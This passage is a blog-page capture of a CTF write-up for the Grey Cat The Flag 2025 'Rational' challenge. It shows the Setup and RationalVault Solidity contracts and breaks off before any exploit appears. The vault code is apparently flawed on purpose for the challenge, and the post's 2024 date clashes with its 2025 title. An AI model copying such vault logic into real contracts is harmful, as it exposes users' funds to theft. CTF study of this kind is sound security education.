<!DOCTYPE html><!--xOmyQrz477VMR99oMhEMM--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/797e433ab948586e-s.p.dbea232f.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/caa3a2e1cccd8315-s.p.853070df.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/chunks/8a80e7184ad3a13f.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/chunks/3aecbadcd45aebe7.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/4995e6db2daa090b.js"/><script src="/_next/static/chunks/7040e0a9a37df246.js" async=""></script><script src="/_next/static/chunks/01e9332dc3878a61.js" async=""></script><script src="/_next/static/chunks/32f4ce06fb5da485.js" async=""></script><script src="/_next/static/chunks/d995f95b0c6e0b87.js" async=""></script><script src="/_next/static/chunks/turbopack-503fe7d176a0168c.js" async=""></script><script src="/_next/static/chunks/13f8b9b460cab25b.js" async=""></script><script src="/_next/static/chunks/cc162e5663281663.js" async=""></script><script src="/_next/static/chunks/db909c0d74f8c046.js" async=""></script><script src="/_next/static/chunks/b05a5109468bf8e7.js" async=""></script><script src="/_next/static/chunks/63bdf154c4daac0e.js" async=""></script><meta name="next-size-adjust" content=""/><title>Satya Bhaskar Peruri</title><meta name="description" content="Security researcher, auditor, and blockchain developer specializing in smart contract security and Web3 development"/><meta name="generator" content="Me"/><link rel="icon" href="/sun9.png" media="(prefers-color-scheme: light)"/><link rel="icon" href="/sun9.png" media="(prefers-color-scheme: dark)"/><link rel="icon" href="/sun9.png" type="image/svg+xml"/><link rel="apple-touch-icon" href="/sun9.png"/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="font-sans antialiased"><div hidden=""><!--$--><!--/$--></div><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","dark",null,["light","dark"],null,true,true)</script><div class="min-h-screen"><header class="fixed top-0 left-0 right-0 z-50 border-b border-primary/20 bg-background/60 backdrop-blur-xl"><div class="absolute inset-0 bg-gradient-to-r from-primary/5 via-accent/5 to-secondary/5 pointer-events-none"></div><div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 relative z-10"><div class="flex h-16 items-center justify-between"><a class="flex items-center gap-2 group" href="/"><div class="relative"></div><span class="font-mono font-semibold text-lg bg-gradient-to-r from-foreground to-primary bg-clip-text">Satya Bhaskar Peruri</span></a><nav class="hidden md:flex items-center gap-8"><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/#about">About<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/experience">Experience<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/blogs">Blogs<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/projects">Projects<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/opensource">Open Source Contributions<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/socials">Socials<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a></nav><button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:text-accent-foreground dark:hover:bg-accent/50 size-9 ml-4 hover:bg-primary/10 border border-primary/20 hover:border-primary/40 transition-all"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-5 w-5 rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0 text-primary"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-5 w-5 rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100 text-primary"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button></div></div></header><main class="pt-24 pb-16 px-4 sm:px-6 lg:px-8"><article class="mx-auto max-w-4xl"><a data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 h-9 px-4 py-2 has-[&gt;svg]:px-3 mb-8 gap-2" href="/blogs"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left h-4 w-4"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Blogs</a><header class="mb-8"><h1 class="text-4xl md:text-5xl font-bold mb-4 text-balance">Grey Cat The Flag 2025 Rational Challenge Writeup</h1><div class="flex flex-wrap items-center gap-4 text-muted-foreground mb-4"><div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar h-4 w-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg><span>2024-01-10</span></div><div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-4 w-4"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg><span>15 min read</span></div></div><div class="flex flex-wrap gap-2"><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">CTF</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Smart Contract Security</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Solidity</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Vulnerability Analysis</span></div></header><div class="prose prose-lg dark:prose-invert max-w-none"><h2>Challenge Overview</h2>
<p><strong>Objective:</strong> Start with 1000 GREY tokens and exploit the vault system to accumulate at least 6000 GREY tokens.</p>
<h2>Architecture Analysis</h2>
<h3>Core Components</h3>
<p>The challenge consists of three main contracts working together:</p>
<ol>
<li><strong>SetUp Contract</strong> - Challenge environment and initialization</li>
<li><strong>RationalVault</strong> - ERC20-like vault with custom rational number precision</li>
<li><strong>RationalLib</strong> - Custom library for fractional number arithmetic</li>
</ol>
<h3>SetUp Contract</h3>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-javascript" style="white-space:pre;color:#9cdcfe;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">GREY</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;./lib/GREY.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">RationalVault</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;./Vault.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>contract </span><span class="token" style="color:#4ec9b0">Setup</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    bool </span><span class="token" style="color:#569CD6">public</span><span> claimed</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// GREY token</span><span>
</span><span>    </span><span class="token" style="color:#9cdcfe">GREY</span><span> </span><span class="token" style="color:#569CD6">public</span><span> grey</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Challenge contracts</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">RationalVault</span><span> </span><span class="token" style="color:#569CD6">public</span><span> vault</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// Deploy the GREY token contract</span><span>
</span><span>        grey </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">GREY</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Deploy challenge contracts</span><span>
</span><span>        vault </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">RationalVault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span>grey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Mint 6000 GREY for setup</span><span>
</span><span>        grey</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">6000e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// Deposit 5000 GREY into the vault</span><span>
</span><span>        grey</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span>vault</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">5000e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vault</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">deposit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">5000e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Note: Call this function to claim 1000 GREY for the challenge</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">claim</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>claimed</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;already claimed&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        claimed </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        grey</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1000e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// Note: Challenge is solved when you have 6000 GREY</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">isSolved</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> grey</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#b5cea8">6000e18</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p>The SetUp contract initializes the challenge environment:</p>
<ul>
<li>Deploys a GREY token and RationalVault</li>
<li>Mints 6000 GREY tokens to itself</li>
<li>Deposits 5000 GREY into the vault (receiving 5000 shares)</li>
<li>Reserves 1000 GREY for the player via <code>claim()</code> function</li>
<li>Victory condition: Player must accumulate â‰¥ 6000 GREY tokens</li>
</ul>
<h3>RationalVault Contract</h3>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-javascript" style="white-space:pre;color:#9cdcfe;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>
</span><span></span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span>pragma solidity </span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.20</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">IERC20</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;./lib/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">Rational</span><span class="token" style="color:#d4d4d4">,</span><span class="token"> </span><span class="token" style="color:#9cdcfe">RationalLib</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;./lib/Rational.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>contract </span><span class="token" style="color:#4ec9b0">RationalVault</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#9cdcfe">IERC20</span><span> </span><span class="token" style="color:#569CD6">public</span><span> asset</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> internal sharesOf</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">Rational</span><span> internal totalShares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// ======================================== CONSTRUCTOR ========================================</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address _asset</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        asset </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#9cdcfe">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>_asset</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// ======================================== MUTATIVE FUNCTIONS ========================================</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">deposit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 amount</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _shares </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">convertToShares</span><span class="token" style="color:#d4d4d4">(</span><span>amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        totalShares </span><span class="token" style="color:#d4d4d4">=</span><span> totalShares </span><span class="token" style="color:#d4d4d4">+</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        asset</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 shares</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _shares </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span>shares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        uint256 amount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">convertToAssets</span><span class="token" style="color:#d4d4d4">(</span><span>_shares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        totalShares </span><span class="token" style="color:#d4d4d4">=</span><span> totalShares </span><span class="token" style="color:#d4d4d4">+</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        asset</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 amount</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _shares </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">convertToShares</span><span class="token" style="color:#d4d4d4">(</span><span>amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        totalShares </span><span class="token" style="color:#d4d4d4">=</span><span> totalShares </span><span class="token" style="color:#d4d4d4">-</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        asset</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">redeem</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint128 shares</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">Rational</span><span> _shares </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">fromUint128</span><span class="token" style="color:#d4d4d4">(</span><span>shares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        uint256 amount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">convertToAssets</span><span class="token" style="color:#d4d4d4">(</span><span>_shares</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> sharesOf</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        totalShares </span><span class="token" style="color:#d4d4d4">=</span><span> totalShares </span><span class="token" style="color:#d4d4d4">-</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        asset</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// ======================================== VIEW FUNCTIONS ========================================</span><span>
</span>
